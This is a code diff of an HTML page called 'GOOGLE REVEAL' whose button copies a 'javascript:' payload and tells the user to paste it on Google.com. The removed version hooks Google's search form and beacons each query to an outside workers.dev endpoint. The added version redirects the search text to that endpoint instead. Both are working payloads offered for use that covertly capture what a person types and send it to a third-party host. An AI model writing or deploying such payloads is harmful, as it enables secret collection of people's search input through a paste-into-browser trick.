@@ -10,7 +10,6 @@
         h1 { font-weight: 200; letter-spacing: 4px; font-size: 1.1rem; margin-bottom: 40px; color: #888; }
         .setup-zone { margin-bottom: 40px; text-align: center; }
         label { display: block; font-size: 0.65rem; text-transform: uppercase; color: #444; margin-bottom: 15px; letter-spacing: 2px; }
-        .status-dot { width: 10px; height: 10px; background: var(--accent); border-radius: 50%; display: inline-block; margin-right: 10px; box-shadow: 0 0 10px var(--accent); }
         .btn { background: #fff; color: #000; padding: 20px; border-radius: 18px; font-size: 0.9rem; font-weight: 700; border: none; cursor: pointer; width: 280px; letter-spacing: 1px; }
         #confirm { margin-top: 25px; font-size: 0.7rem; color: var(--accent); font-weight: 600; text-transform: uppercase; opacity: 0; transition: 0.3s; }
     </style>
@@ -19,23 +18,22 @@
 
     <h1>GOOGLE REVEAL</h1>
     <div class="setup-zone">
-        <label><span class="status-dot"></span>READY TO ARM</label>
+        <label>IMMEDIATE REDIRECT MODE</label>
     </div>
-    <button class="btn" onclick="engage()">COPY REVEAL PAYLOAD</button>
-    <div id="confirm">Payload Copied to Clipboard</div>
+    <button class="btn" onclick="engage()">COPY INSTANT PAYLOAD</button>
+    <div id="confirm">Ready. Paste on Google.com</div>
 
     <script>
         function engage() {
-            const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev/api/save';
+            const WORKER_URL = 'https://google-reveal.avishaierel.workers.dev/';
 
-            // The Payload: Optimized for Google's real DOM structure
-            const payload = `javascript:(function(){const E='${ENDPOINT}';const i=document.querySelector('textarea[name="q"]')||document.querySelector('input[name="q"]');const f=i?i.closest('form'):null;if(f){f.addEventListener('submit',()=>{const q=(i.value||'').trim();if(q){const p=new URLSearchParams({q});if(navigator.sendBeacon){navigator.sendBeacon(E,new Blob([p.toString()],{type:'application/x-www-form-urlencoded'}));}else{fetch(E,{method:'POST',body:p,mode:'cors',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'}});}}}, {capture:true});i.style.boxShadow='0 0 10px #4285F4';}else{alert('Search not found');}})();`;
+            // This payload grabs the text and jumps to your worker immediately
+            const payload = `javascript:(function(){const i=document.querySelector('textarea[name="q"]')||document.querySelector('input[name="q"]');const q=i?encodeURIComponent(i.value):'';if(q){window.location.href='${WORKER_URL}?q='+q;}else{alert('Type something first!');}})();`;
 
             navigator.clipboard.writeText(payload).then(() => {
-                const confirmMsg = document.getElementById('confirm');
-                confirmMsg.style.opacity = "1";
+                document.getElementById('confirm').style.opacity = "1";
                 setTimeout(() => {
-                    window.location.replace("https://www.google.com/");
+                    window.location.href = "https://www.google.com/";
                 }, 800);
             });
         }
